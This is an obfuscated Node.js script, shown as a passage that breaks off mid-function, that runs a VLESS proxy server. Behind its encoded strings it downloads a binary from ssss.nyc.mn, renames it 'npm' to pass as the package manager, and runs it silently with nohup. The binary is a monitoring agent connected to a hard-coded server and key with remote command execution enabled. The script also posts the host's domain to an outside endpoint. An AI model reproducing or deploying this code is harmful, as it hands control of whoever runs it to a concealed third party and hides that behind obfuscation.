const _0x465188=_0x246b;function _0x2c58(){const _0x1e89a4=['http','Transform','Automatic\x20Access\x20Task\x20added\x20successfully:','none','&fp=chrome&allowInsecure=1&type=xhttp&host=','chunked','length','set','Read\x20controller\x20close\x20error:','2053','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20false\x0aip_report_period:\x201800\x0areport_delay:\x201\x0aserver:\x20','https://amd64.ssss.nyc.mn/v1','message','730260TfDyfM','no-store','UsC5sNDciSaNggxJdB3EGSGYS242VT7q','GET','Transfer-Encoding','Failed\x20to\x20get\x20IP\x20address:','nzku.fortymenty.eu.org:443','parse\x20hostname\x20failed','port','https://arm64.ssss.nyc.mn/agent','pop','https://','Created\x20new\x20session\x20for\x20POST:\x20','SUB_PATH','Remote\x20connection\x20established','663528IezxNm','Starting\x20to\x20parse\x20VLESS\x20header','lastActivity','Connection\x20failed:\x20','curl\x20-s\x20--max-time\x202\x20ipv4.ip.sb','--tls','\x20before\x20initialization','arch','LOG_LEVEL','Cleanup\x20error:\x20','VLESS\x20header\x20parse\x20error:\x20','UUID','writeFileSync','buffer','&path=','arm64','MAX_BUFFERED_POSTS','write','chmod\x20+x\x20npm','headersTimeout','Remote\x20connection\x20not\x20available','29232XgNNVH','NAME','bufferedData','headersSent','info','Initializing\x20VLESS\x20connection\x20from\x20first\x20packet','vlessHeader','\x1b[33m','forEach','VLESS\x20connection\x20to\x20','sub','Relay\x20error:','utf-8','replaceAll','Sending\x20VLESS\x20response\x20header\x20(','invalid\x20UUID','8443','alpnProtocol','Session\x20timeout:\x20','curl\x20-s\x20--max-time\x201\x20ipv6.ip.sb','delete','Failed\x20to\x20process\x20POST\x20request:\x20','bytes','resume','concat','Content-Type','enqueue','setNoDelay','Error\x20starting\x20downstream:\x20','getReader','nextTick','Vls','NEZHA_PORT','_writeToRemote','%2F','Failed\x20to\x20initialize\x20VLESS:\x20','aarch64','value','from','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','Connected\x20to\x20','NEZHA_KEY','writableEnded','10897523NyyocJ','releaseLock','npm\x20running\x20error:\x20','createServer','Server\x20is\x20running\x20on\x20port\x20','destroyed','03397d9a-9998-49db-8ebf-f6b8c65b0f11','nohup\x20./npm\x20-s\x20','push','destroy','application/octet-stream','close','\x22}\x27','curl\x20-X\x20POST\x20\x22https://oooo.serv00.net/add-url\x22\x20-H\x20\x22Content-Type:\x20application/json\x22\x20-d\x20\x27{\x22url\x22:\x20\x22',',\x20size=','setKeepAlive','Created\x20new\x20session\x20for\x20GET:\x20','finish','Created\x20new\x20session\x20with\x20UUID:\x20','Upload\x20error:\x20','cleaned','Read\x20controller\x20error:','1120256QLXQBB','pipe','curl\x20-s\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27','arm','Received\x20out\x20of\x20order\x20packet\x20seq=','header\x20length\x20too\x20short','warn','2083','initialized','/([^/]+)(?:/([0-9]+))?$','pause','PORT','bufferSize','headerSent','2096','unlink','responseHeader','Socket\x20is\x20destroyed','writable','downstreamStarted','catch','random','hostname','true','readable','join','writeHead','config.yaml','http/1.1','Log\x20level:\x20','Processing\x20packet:\x20seq=','url','GET,\x20POST','cleanup','50NUbdwh','socket','\x20>/dev/null\x202>&1\x20&','aborted','currentStreamRes','XPATH','2048','Remote\x20error:\x20','method','now','data','localhost','unsupported\x20command:\x20','end','toString','slice','26159528zLqGhj','NEZHA_SERVER','Failed\x20to\x20start\x20downstream\x20for\x20session:\x20','socket\x20hang\x20up','Client\x20connection\x20closed','startDownstream','uuid','MAX_POST_SIZE','read\x20address\x20type\x20failed','CHUNK_SIZE','\x1b[31m','):\x20','read','Failed\x20to\x20write\x20to\x20remote:\x20','443',']\x20[','Failed\x20to\x20initialize\x20VLESS\x20connection','keepAliveTimeout','\x20timed\x20out\x20without\x20downstream','log','\x20-p\x20','SESSION_TIMEOUT','env','BUFFER_SIZE','2087','error','includes','VLESS\x20header\x20parsed\x20successfully','not\x20enough\x20data\x20to\x20read','npm','New\x20secure\x20connection\x20using:\x20','Error\x20sending\x20request:','done','connect\x20timeout','processPacket','Too\x20many\x20buffered\x20packets','\x1b[0m','DOMAIN','read\x20vless\x20header\x20error:\x20','889287UuLVQw','debug','split','&mode=packet-up#','Session\x20','text/plain','constructor','pendingPackets','resp','/bin/bash','stream','POST','trim','reset','pendingBuffers','remote','finally','get','_startDownstreamResponse','initializeVLESS','child_process','substr','nextSeq','Processed\x20packet\x20seq=','fill','Failed\x20to\x20parse\x20hostname'];_0x2c58=function(){return _0x1e89a4;};return _0x2c58();}function _0x246b(_0x47f8a3,_0x3f024e){const _0x2c580c=_0x2c58();return _0x246b=function(_0x246b54,_0x3fdddd){_0x246b54=_0x246b54-0x1ec;let _0xc14ec9=_0x2c580c[_0x246b54];return _0xc14ec9;},_0x246b(_0x47f8a3,_0x3f024e);}(function(_0x4cd1ae,_0x1681e5){const _0x1aceab=_0x246b,_0x45f571=_0x4cd1ae();while(!![]){try{const _0xb5d2b1=-parseInt(_0x1aceab(0x25f))/0x1+parseInt(_0x1aceab(0x23b))/0x2+parseInt(_0x1aceab(0x214))/0x3+-parseInt(_0x1aceab(0x2a0))/0x4+parseInt(_0x1aceab(0x2c2))/0x5*(-parseInt(_0x1aceab(0x24a))/0x6)+-parseInt(_0x1aceab(0x28a))/0x7+parseInt(_0x1aceab(0x1ed))/0x8;if(_0xb5d2b1===_0x1681e5)break;else _0x45f571['push'](_0x45f571['shift']());}catch(_0x38bb24){_0x45f571['push'](_0x45f571['shift']());}}}(_0x2c58,0xea42f));const os=require('os'),fs=require('fs'),net=require('net'),http=require(_0x465188(0x22e)),axios=require('axios'),{Buffer}=require(_0x465188(0x257)),{exec,execSync}=require(_0x465188(0x228)),UUID=process['env'][_0x465188(0x255)]||_0x465188(0x290),NEZHA_SERVER=process[_0x465188(0x203)][_0x465188(0x1ee)]||_0x465188(0x241),NEZHA_PORT=process[_0x465188(0x203)][_0x465188(0x27f)]||'',NEZHA_KEY=process['env'][_0x465188(0x288)]||_0x465188(0x23d),AUTO_ACCESS=process[_0x465188(0x203)]['AUTO_ACCESS']||![],XPATH=process[_0x465188(0x203)][_0x465188(0x2c7)]||UUID[_0x465188(0x1ec)](0x0,0x8),SUB_PATH=process['env'][_0x465188(0x248)]||_0x465188(0x269),DOMAIN=process[_0x465188(0x203)][_0x465188(0x212)]||'',NAME=process[_0x465188(0x203)][_0x465188(0x260)]||_0x465188(0x27e),PORT=process[_0x465188(0x203)][_0x465188(0x2ab)]||0xbb8,SETTINGS={[_0x465188(0x255)]:UUID,[_0x465188(0x252)]:'none',[_0x465188(0x204)]:_0x465188(0x2c8),[_0x465188(0x2c7)]:_0x465188(0x281)+XPATH,[_0x465188(0x25a)]:0x1e,[_0x465188(0x1f4)]:0xf4240,[_0x465188(0x202)]:0x7530,[_0x465188(0x1f6)]:0x400*0x400,['TCP_NODELAY']:!![],['TCP_KEEPALIVE']:!![]};function validate_uuid(_0x38a3bf,_0x2bd8d7){for(let _0x36182d=0x0;_0x36182d<0x10;_0x36182d++){if(_0x38a3bf[_0x36182d]!==_0x2bd8d7[_0x36182d])return![];}return!![];}function concat_typed_arrays(_0x23f019,..._0x4c6825){const _0x1be61c=_0x465188;if(!_0x4c6825||_0x4c6825[_0x1be61c(0x234)]<0x1)return _0x23f019;let _0x1eb87b=_0x23f019[_0x1be61c(0x234)];for(let _0x241e05 of _0x4c6825)_0x1eb87b+=_0x241e05[_0x1be61c(0x234)];const _0xd5d401=new _0x23f019[(_0x1be61c(0x21a))](_0x1eb87b);_0xd5d401['set'](_0x23f019,0x0),_0x1eb87b=_0x23f019['length'];for(let _0x1c4b0c of _0x4c6825){_0xd5d401[_0x1be61c(0x235)](_0x1c4b0c,_0x1eb87b),_0x1eb87b+=_0x1c4b0c[_0x1be61c(0x234)];}return _0xd5d401;}function log(_0x332ad2,..._0x28a3a1){const _0x2fb0c4=_0x465188;if(SETTINGS[_0x2fb0c4(0x252)]===_0x2fb0c4(0x231))return;const _0x48eb2f={'debug':0x0,'info':0x1,'warn':0x2,'error':0x3},_0x33ba6b={'debug':'\x1b[36m','info':'\x1b[32m','warn':_0x2fb0c4(0x266),'error':_0x2fb0c4(0x1f7),'reset':_0x2fb0c4(0x211)},_0x10ca25=_0x48eb2f[SETTINGS[_0x2fb0c4(0x252)]]||0x1,_0x2bd161=_0x48eb2f[_0x332ad2]||0x0;if(_0x2bd161>=_0x10ca25){const _0x164690=new Date()['toISOString'](),_0x388dad=_0x33ba6b[_0x332ad2]||_0x33ba6b[_0x2fb0c4(0x221)];console['log'](_0x388dad+'['+_0x164690+_0x2fb0c4(0x1fc)+_0x332ad2+']',..._0x28a3a1,_0x33ba6b[_0x2fb0c4(0x221)]);}}const getDownloadUrl=()=>{const _0x3fd749=_0x465188,_0x1729d1=os[_0x3fd749(0x251)]();return _0x1729d1===_0x3fd749(0x2a3)||_0x1729d1===_0x3fd749(0x259)||_0x1729d1===_0x3fd749(0x283)?!NEZHA_PORT?'https://arm64.ssss.nyc.mn/v1':_0x3fd749(0x244):!NEZHA_PORT?_0x3fd749(0x239):'https://amd64.ssss.nyc.mn/agent';},downloadFile=async()=>{const _0x182c93=_0x465188;if(!NEZHA_KEY)return;try{const _0x1aeebb=getDownloadUrl(),_0x23c53f=await axios({'method':_0x182c93(0x225),'url':_0x1aeebb,'responseType':'stream'}),_0x9ff811=fs['createWriteStream']('npm');return _0x23c53f[_0x182c93(0x2cc)][_0x182c93(0x2a1)](_0x9ff811),new Promise((_0x390e7e,_0x5a70d0)=>{const _0x1bb534=_0x182c93;_0x9ff811['on'](_0x1bb534(0x29b),()=>{const _0x50e772=_0x1bb534;console[_0x50e772(0x200)]('npm\x20download\x20successfully'),exec(_0x50e772(0x25c),_0x38a30a=>{if(_0x38a30a)_0x5a70d0(_0x38a30a);_0x390e7e();});}),_0x9ff811['on'](_0x1bb534(0x206),_0x5a70d0);});}catch(_0x2e39f4){throw _0x2e39f4;}},runnz=async()=>{const _0x3fda12=_0x465188;await downloadFile();let _0xecf48b='',_0x5164b3='';if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x33257b=[_0x3fda12(0x1fb),_0x3fda12(0x26f),_0x3fda12(0x2ae),_0x3fda12(0x205),_0x3fda12(0x2a7),_0x3fda12(0x237)];_0xecf48b=_0x33257b[_0x3fda12(0x207)](NEZHA_PORT)?_0x3fda12(0x24f):'',_0x5164b3=_0x3fda12(0x291)+NEZHA_SERVER+':'+NEZHA_PORT+_0x3fda12(0x201)+NEZHA_KEY+'\x20'+_0xecf48b+_0x3fda12(0x2c4);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x48c3a1=NEZHA_SERVER[_0x3fda12(0x207)](':')?NEZHA_SERVER[_0x3fda12(0x216)](':')[_0x3fda12(0x245)]():'',_0x4379b4=new Set([_0x3fda12(0x1fb),_0x3fda12(0x26f),_0x3fda12(0x2ae),'2087',_0x3fda12(0x2a7),'2053']),_0x1bbd95=_0x4379b4['has'](_0x48c3a1)?_0x3fda12(0x2b7):'false',_0x574d30='\x0aclient_secret:\x20'+NEZHA_KEY+_0x3fda12(0x238)+NEZHA_SERVER+'\x0askip_connection_count:\x20false\x0askip_procs_count:\x20false\x0atemperature:\x20false\x0atls:\x20'+_0x1bbd95+_0x3fda12(0x286)+UUID;fs[_0x3fda12(0x256)](_0x3fda12(0x2bb),_0x574d30);}_0x5164b3='nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&';}else return;}try{exec(_0x5164b3,{'shell':_0x3fda12(0x21d)}),console['log']('npm\x20is\x20running');}catch(_0x35e5c2){console['error'](_0x3fda12(0x28c)+_0x35e5c2);}};async function addAccessTask(){const _0x4af28c=_0x465188;if(AUTO_ACCESS!==!![])return;try{if(!DOMAIN)return;const _0x45e2a9=_0x4af28c(0x246)+DOMAIN,_0x2093cf=_0x4af28c(0x297)+_0x45e2a9+_0x4af28c(0x296);exec(_0x2093cf,(_0x2dcd4f,_0x2ff4bd,_0x4b7917)=>{const _0x5bc6ac=_0x4af28c;if(_0x2dcd4f){console['error'](_0x5bc6ac(0x20c),_0x2dcd4f[_0x5bc6ac(0x23a)]);return;}console[_0x5bc6ac(0x200)](_0x5bc6ac(0x230),_0x2ff4bd);});}catch(_0xac26f8){console[_0x4af28c(0x206)]('Error\x20added\x20Task:',_0xac26f8['message']);}}function parse_uuid(_0x5608dd){const _0x239c3a=_0x465188;_0x5608dd=_0x5608dd[_0x239c3a(0x26c)]('-','');const _0x35de14=[];for(let _0x1760d2=0x0;_0x1760d2<0x10;_0x1760d2++){_0x35de14[_0x239c3a(0x292)](parseInt(_0x5608dd[_0x239c3a(0x229)](_0x1760d2*0x2,0x2),0x10));}return _0x35de14;}async function read_vless_header(_0x3dac0,_0x27eeab){const _0x1e4809=_0x465188;let _0x30b80e=0x0,_0x257616=new Uint8Array(),_0x12f52={'value':_0x257616,'done':![]};async function _0x23676a(_0x53a404){const _0x33c55c=_0x246b;if(_0x12f52[_0x33c55c(0x20d)])throw new Error(_0x33c55c(0x2a5));const _0x10f638=_0x53a404-_0x30b80e;if(_0x10f638<0x1)return;_0x12f52=await read_atleast(_0x3dac0,_0x10f638),_0x30b80e+=_0x12f52[_0x33c55c(0x284)]['length'],_0x257616=concat_typed_arrays(_0x257616,_0x12f52[_0x33c55c(0x284)]);}await _0x23676a(0x1+0x10+0x1);const _0x15ea0d=_0x257616[0x0],_0x35ae60=_0x257616[_0x1e4809(0x1ec)](0x1,0x1+0x10),_0x3c9992=parse_uuid(_0x27eeab);if(!validate_uuid(_0x35ae60,_0x3c9992))throw new Error(_0x1e4809(0x26e));const _0x2a0953=_0x257616[0x1+0x10],_0x5c8fac=0x1+0x10+0x1+_0x2a0953+0x1+0x2+0x1;await _0x23676a(_0x5c8fac+0x1);const _0x580841=_0x257616[0x1+0x10+0x1+_0x2a0953],_0x408954=0x1;if(_0x580841!==_0x408954)throw new Error(_0x1e4809(0x2ce)+_0x580841);const _0x240ccb=(_0x257616[_0x5c8fac-0x1-0x2]<<0x8)+_0x257616[_0x5c8fac-0x1-0x1],_0x2bab62=_0x257616[_0x5c8fac-0x1],_0x3c14bf=0x1,_0x120370=0x2,_0x4ddd78=0x3;let _0x55456d=-0x1;if(_0x2bab62===_0x3c14bf)_0x55456d=_0x5c8fac+0x4;else{if(_0x2bab62===_0x4ddd78)_0x55456d=_0x5c8fac+0x10;else _0x2bab62===_0x120370&&(_0x55456d=_0x5c8fac+0x1+_0x257616[_0x5c8fac]);}if(_0x55456d<0x0)throw new Error(_0x1e4809(0x1f5));await _0x23676a(_0x55456d);const _0x27c07d=_0x5c8fac;let _0x3e7a4a='';if(_0x2bab62===_0x3c14bf)_0x3e7a4a=_0x257616[_0x1e4809(0x1ec)](_0x27c07d,_0x27c07d+0x4)[_0x1e4809(0x2b9)]('.');else{if(_0x2bab62===_0x120370)_0x3e7a4a=new TextDecoder()['decode'](_0x257616[_0x1e4809(0x1ec)](_0x27c07d+0x1,_0x27c07d+0x1+_0x257616[_0x27c07d]));else _0x2bab62===_0x4ddd78&&(_0x3e7a4a=_0x257616[_0x1e4809(0x1ec)](_0x27c07d,_0x27c07d+0x10)['reduce']((_0x184037,_0x37b5fc,_0x14458f,_0x1aca59)=>_0x14458f%0x2?_0x184037[_0x1e4809(0x277)](((_0x1aca59[_0x14458f-0x1]<<0x8)+_0x37b5fc)['toString'](0x10)):_0x184037,[])[_0x1e4809(0x2b9)](':'));}if(!_0x3e7a4a){log(_0x1e4809(0x206),_0x1e4809(0x22d));throw new Error(_0x1e4809(0x242));}return log(_0x1e4809(0x263),_0x1e4809(0x268)+_0x3e7a4a+':'+_0x240ccb),{'hostname':_0x3e7a4a,'port':_0x240ccb,'data':_0x257616['slice'](_0x55456d),'resp':new Uint8Array([_0x15ea0d,0x0])};}async function read_atleast(_0x350fc3,_0x38b155){const _0x411002=_0x465188,_0x3b2c9e=[];let _0x23d9ed=![];while(_0x38b155>0x0&&!_0x23d9ed){const _0x2459be=await _0x350fc3[_0x411002(0x1f9)]();if(_0x2459be['value']){const _0x217817=new Uint8Array(_0x2459be[_0x411002(0x284)]);_0x3b2c9e['push'](_0x217817),_0x38b155-=_0x217817[_0x411002(0x234)];}_0x23d9ed=_0x2459be[_0x411002(0x20d)];}if(_0x38b155>0x0)throw new Error(_0x411002(0x209));return{'value':concat_typed_arrays(..._0x3b2c9e),'done':_0x23d9ed};}async function parse_header(_0x34f0d6,_0x153713){const _0x4d7170=_0x465188;log(_0x4d7170(0x215),_0x4d7170(0x24b));const _0x13461d=_0x153713[_0x4d7170(0x2b8)][_0x4d7170(0x27c)]();try{const _0x151a71=await read_vless_header(_0x13461d,_0x34f0d6);return log(_0x4d7170(0x215),_0x4d7170(0x208)),_0x151a71;}catch(_0x34b846){log('error',_0x4d7170(0x254)+_0x34b846[_0x4d7170(0x23a)]);throw new Error(_0x4d7170(0x213)+_0x34b846[_0x4d7170(0x23a)]);}finally{_0x13461d[_0x4d7170(0x28b)]();}}async function connect_remote(_0x5fff1d,_0x57650f){const _0x262762=_0x465188,_0xf09fc9=0x1f40;try{const _0x2dfbd2=await timed_connect(_0x5fff1d,_0x57650f,_0xf09fc9);return _0x2dfbd2[_0x262762(0x27a)](!![]),_0x2dfbd2[_0x262762(0x299)](!![],0x3e8),_0x2dfbd2[_0x262762(0x2ac)]=parseInt(SETTINGS['BUFFER_SIZE'])*0x400,log(_0x262762(0x263),_0x262762(0x287)+_0x5fff1d+':'+_0x57650f),_0x2dfbd2;}catch(_0x9969f0){log(_0x262762(0x206),_0x262762(0x24d)+_0x9969f0['message']);throw _0x9969f0;}}function timed_connect(_0x49310e,_0x314095,_0x5c7b74){return new Promise((_0x3c3bd9,_0x340d9e)=>{const _0x1944d3=_0x246b,_0x2c5c64=net['createConnection']({'host':_0x49310e,'port':_0x314095}),_0x59b1e9=setTimeout(()=>{const _0x45e917=_0x246b;_0x340d9e(new Error(_0x45e917(0x20e)));},_0x5c7b74);_0x2c5c64['on']('connect',()=>{clearTimeout(_0x59b1e9),_0x3c3bd9(_0x2c5c64);}),_0x2c5c64['on'](_0x1944d3(0x206),_0x40b3cf=>{clearTimeout(_0x59b1e9),_0x340d9e(_0x40b3cf);});});}function pipe_relay(){async function _0x37738b(_0x4ef2d4,_0x102aff,_0x46c21f){const _0x1ea563=_0x246b,_0x561096=parseInt(SETTINGS[_0x1ea563(0x1f6)]);if(_0x46c21f[_0x1ea563(0x234)]>0x0){if(_0x102aff[_0x1ea563(0x25b)])_0x102aff['cork'](),_0x102aff[_0x1ea563(0x25b)](_0x46c21f),process[_0x1ea563(0x27d)](()=>_0x102aff['uncork']());else{const _0x350e48=_0x102aff[_0x1ea563(0x2b2)]['getWriter']();try{await _0x350e48[_0x1ea563(0x25b)](_0x46c21f);}finally{_0x350e48[_0x1ea563(0x28b)]();}}}try{_0x4ef2d4[_0x1ea563(0x2a1)]?(_0x4ef2d4[_0x1ea563(0x2aa)](),_0x4ef2d4[_0x1ea563(0x2a1)](_0x102aff,{'end':!![],'highWaterMark':_0x561096}),_0x4ef2d4[_0x1ea563(0x276)]()):await _0x4ef2d4[_0x1ea563(0x2b8)]['pipeTo'](_0x102aff['writable'],{'preventClose':![],'preventAbort':![],'preventCancel':![],'signal':AbortSignal['timeout'](SETTINGS[_0x1ea563(0x202)])});}catch(_0x396530){!_0x396530[_0x1ea563(0x23a)]['includes'](_0x1ea563(0x2c5))&&log(_0x1ea563(0x206),_0x1ea563(0x26a),_0x396530[_0x1ea563(0x23a)]);throw _0x396530;}}return _0x37738b;}function socketToWebStream(_0x3cad39){let _0xc773d0,_0xe68408;return _0x3cad39['on']('error',_0xa6e5b8=>{const _0x3dfd64=_0x246b;log(_0x3dfd64(0x206),'Socket\x20error:',_0xa6e5b8['message']),_0xc773d0?.['error'](_0xa6e5b8),_0xe68408?.[_0x3dfd64(0x206)](_0xa6e5b8);}),{'readable':new ReadableStream({'start'(_0x5cbae1){const _0x5025d9=_0x246b;_0xc773d0=_0x5cbae1,_0x3cad39['on'](_0x5025d9(0x2cc),_0x8a5c73=>{const _0x4ed79d=_0x5025d9;try{_0x5cbae1['enqueue'](_0x8a5c73);}catch(_0x1ac6d2){log(_0x4ed79d(0x206),_0x4ed79d(0x29f),_0x1ac6d2[_0x4ed79d(0x23a)]);}}),_0x3cad39['on'](_0x5025d9(0x2cf),()=>{const _0x4f0775=_0x5025d9;try{_0x5cbae1[_0x4f0775(0x295)]();}catch(_0x22fa6d){log(_0x4f0775(0x206),_0x4f0775(0x236),_0x22fa6d[_0x4f0775(0x23a)]);}});},'cancel'(){_0x3cad39['destroy']();}}),'writable':new WritableStream({'start'(_0x31058d){_0xe68408=_0x31058d;},'write'(_0xbeed95){return new Promise((_0x4057cc,_0x5b612e)=>{const _0x570bb5=_0x246b;if(_0x3cad39[_0x570bb5(0x28f)]){_0x5b612e(new Error(_0x570bb5(0x2b1)));return;}_0x3cad39[_0x570bb5(0x25b)](_0xbeed95,_0x345ecc=>{if(_0x345ecc)_0x5b612e(_0x345ecc);else _0x4057cc();});});},'close'(){const _0x15bda0=_0x246b;!_0x3cad39[_0x15bda0(0x28f)]&&_0x3cad39[_0x15bda0(0x2cf)]();},'abort'(_0x2cc900){_0x3cad39['destroy'](_0x2cc900);}})};}function relay(_0x48d16a,_0x5a898f,_0x7f4428,_0x5a94aa){const _0x4230a8=_0x465188,_0x13054a=pipe_relay();let _0x29e892=![];const _0x995de6=socketToWebStream(_0x7f4428);function _0x410829(){const _0x23df8a=_0x246b;if(!_0x29e892){_0x29e892=!![];try{_0x7f4428[_0x23df8a(0x293)]();}catch(_0x1858d6){!_0x1858d6[_0x23df8a(0x23a)][_0x23df8a(0x207)](_0x23df8a(0x2c5))&&!_0x1858d6[_0x23df8a(0x23a)]['includes'](_0x23df8a(0x1f0))&&log(_0x23df8a(0x206),_0x23df8a(0x253)+_0x1858d6[_0x23df8a(0x23a)]);}}}const _0x369f7d=_0x13054a(_0x5a898f,_0x995de6,_0x5a94aa[_0x4230a8(0x2cc)])[_0x4230a8(0x2b4)](_0x461f40=>{const _0x457357=_0x4230a8;!_0x461f40[_0x457357(0x23a)][_0x457357(0x207)]('aborted')&&!_0x461f40['message']['includes'](_0x457357(0x1f0))&&log(_0x457357(0x206),_0x457357(0x29d)+_0x461f40['message']);})['finally'](()=>{_0x5a898f['reading_done']&&_0x5a898f['reading_done']();}),_0x4df675=_0x13054a(_0x995de6,_0x5a898f,_0x5a94aa[_0x4230a8(0x21c)])['catch'](_0x13b264=>{const _0x323a65=_0x4230a8;!_0x13b264[_0x323a65(0x23a)]['includes'](_0x323a65(0x2c5))&&!_0x13b264[_0x323a65(0x23a)][_0x323a65(0x207)]('socket\x20hang\x20up')&&log(_0x323a65(0x206),'Download\x20error:\x20'+_0x13b264[_0x323a65(0x23a)]);});_0x4df675[_0x4230a8(0x224)](()=>_0x369f7d)[_0x4230a8(0x224)](_0x410829);}const sessions=new Map();class Session{constructor(_0x3fb31c){const _0x5c9fb1=_0x465188;this[_0x5c9fb1(0x1f3)]=_0x3fb31c,this[_0x5c9fb1(0x22a)]=0x0,this[_0x5c9fb1(0x2b3)]=![],this[_0x5c9fb1(0x24c)]=Date[_0x5c9fb1(0x2cb)](),this[_0x5c9fb1(0x265)]=null,this[_0x5c9fb1(0x223)]=null,this['initialized']=![],this['responseHeader']=null,this[_0x5c9fb1(0x2ad)]=![],this[_0x5c9fb1(0x261)]=new Map(),this[_0x5c9fb1(0x29e)]=![],this[_0x5c9fb1(0x21b)]=[],this[_0x5c9fb1(0x2c6)]=null,this[_0x5c9fb1(0x222)]=new Map(),log(_0x5c9fb1(0x215),_0x5c9fb1(0x29c)+_0x3fb31c);}async[_0x465188(0x227)](_0x11f4cb){const _0x4c60df=_0x465188;if(this[_0x4c60df(0x2a8)])return!![];try{log(_0x4c60df(0x215),_0x4c60df(0x264));const _0x6b787f=new ReadableStream({'start'(_0x238d46){const _0x249edb=_0x4c60df;_0x238d46[_0x249edb(0x279)](_0x11f4cb),_0x238d46[_0x249edb(0x295)]();}}),_0x2fa5a3={'readable':_0x6b787f,'writable':new WritableStream()};return this[_0x4c60df(0x265)]=await parse_header(SETTINGS['UUID'],_0x2fa5a3),log('info','VLESS\x20header\x20parsed:\x20'+this['vlessHeader']['hostname']+':'+this[_0x4c60df(0x265)][_0x4c60df(0x243)]),this[_0x4c60df(0x223)]=await connect_remote(this[_0x4c60df(0x265)][_0x4c60df(0x2b6)],this[_0x4c60df(0x265)][_0x4c60df(0x243)]),log('info',_0x4c60df(0x249)),this[_0x4c60df(0x2a8)]=!![],!![];}catch(_0x2aeead){return log(_0x4c60df(0x206),_0x4c60df(0x282)+_0x2aeead[_0x4c60df(0x23a)]),![];}}async['processPacket'](_0x4fea4a,_0x5ebbbf){const _0x56ae5e=_0x465188;try{this[_0x56ae5e(0x222)][_0x56ae5e(0x235)](_0x4fea4a,_0x5ebbbf),log('debug','Buffered\x20packet\x20seq='+_0x4fea4a+',\x20size='+_0x5ebbbf[_0x56ae5e(0x234)]);while(this[_0x56ae5e(0x222)]['has'](this['nextSeq'])){const _0x3fbd9b=this[_0x56ae5e(0x222)][_0x56ae5e(0x225)](this['nextSeq']);this['pendingBuffers'][_0x56ae5e(0x273)](this[_0x56ae5e(0x22a)]);if(!this[_0x56ae5e(0x2a8)]&&this[_0x56ae5e(0x22a)]===0x0){if(!await this[_0x56ae5e(0x227)](_0x3fbd9b))throw new Error(_0x56ae5e(0x1fd));this['responseHeader']=Buffer[_0x56ae5e(0x285)](this['vlessHeader'][_0x56ae5e(0x21c)]),await this[_0x56ae5e(0x280)](this[_0x56ae5e(0x265)][_0x56ae5e(0x2cc)]),this[_0x56ae5e(0x2c6)]&&this[_0x56ae5e(0x226)]();}else{if(!this['initialized']){log('warn',_0x56ae5e(0x2a4)+_0x4fea4a+_0x56ae5e(0x250));continue;}await this[_0x56ae5e(0x280)](_0x3fbd9b);}this['nextSeq']++,log(_0x56ae5e(0x215),_0x56ae5e(0x22b)+(this[_0x56ae5e(0x22a)]-0x1));}if(this[_0x56ae5e(0x222)]['size']>SETTINGS[_0x56ae5e(0x25a)])throw new Error(_0x56ae5e(0x210));return!![];}catch(_0x175134){log('error','Process\x20packet\x20error:\x20'+_0x175134['message']);throw _0x175134;}}['_startDownstreamResponse'](){const _0xef9338=_0x465188;if(!this[_0xef9338(0x2c6)]||!this[_0xef9338(0x2b0)])return;try{const _0x4fa647=this['currentStreamRes']['socket']?.[_0xef9338(0x270)]||'http/1.1',_0x3df5d6=_0x4fa647==='h2';!this[_0xef9338(0x2ad)]&&(log(_0xef9338(0x215),_0xef9338(0x26d)+_0x4fa647+_0xef9338(0x1f8)+this[_0xef9338(0x2b0)][_0xef9338(0x234)]+'\x20bytes'),this[_0xef9338(0x2c6)]['write'](this[_0xef9338(0x2b0)]),this[_0xef9338(0x2ad)]=!![]);if(_0x3df5d6){this['currentStreamRes'][_0xef9338(0x2c3)][_0xef9338(0x27a)](!![]);const _0x48788e=new require(_0xef9338(0x21e))[_0xef9338(0x22f)]({'transform'(_0x103afb,_0x56366b,_0x8754b9){const _0x2b2ee6=_0xef9338,_0x330549=0x4000;for(let _0x58a99a=0x0;_0x58a99a<_0x103afb[_0x2b2ee6(0x234)];_0x58a99a+=_0x330549){this['push'](_0x103afb[_0x2b2ee6(0x1ec)](_0x58a99a,_0x58a99a+_0x330549));}_0x8754b9();}});this[_0xef9338(0x223)]['pipe'](_0x48788e)[_0xef9338(0x2a1)](this[_0xef9338(0x2c6)]);}else this[_0xef9338(0x223)][_0xef9338(0x2a1)](this[_0xef9338(0x2c6)]);this[_0xef9338(0x223)]['on'](_0xef9338(0x2cf),()=>{const _0x597e0e=_0xef9338;!this['currentStreamRes'][_0x597e0e(0x289)]&&this[_0x597e0e(0x2c6)][_0x597e0e(0x2cf)]();}),this[_0xef9338(0x223)]['on']('error',_0x413785=>{const _0x43cca2=_0xef9338;log(_0x43cca2(0x206),_0x43cca2(0x2c9)+_0x413785[_0x43cca2(0x23a)]),!this[_0x43cca2(0x2c6)][_0x43cca2(0x289)]&&this['currentStreamRes']['end']();});}catch(_0x596ac3){log(_0xef9338(0x206),'Error\x20starting\x20downstream:\x20'+_0x596ac3[_0xef9338(0x23a)]),this[_0xef9338(0x2c1)]();}}['startDownstream'](_0x4bab64,_0x18434e){const _0x60b856=_0x465188;return!_0x4bab64[_0x60b856(0x262)]&&_0x4bab64['writeHead'](0xc8,_0x18434e),this[_0x60b856(0x2c6)]=_0x4bab64,this['initialized']&&this['responseHeader']&&this[_0x60b856(0x226)](),_0x4bab64['on'](_0x60b856(0x295),()=>{const _0x63e8b1=_0x60b856;log(_0x63e8b1(0x263),_0x63e8b1(0x1f1)),this[_0x63e8b1(0x2c1)]();}),!![];}async[_0x465188(0x280)](_0x4638f4){const _0x435a19=_0x465188;if(!this['remote']||this[_0x435a19(0x223)][_0x435a19(0x28f)])throw new Error(_0x435a19(0x25e));return new Promise((_0x4f1450,_0x438c05)=>{const _0x4d27b8=_0x435a19;this[_0x4d27b8(0x223)][_0x4d27b8(0x25b)](_0x4638f4,_0xa8cf82=>{const 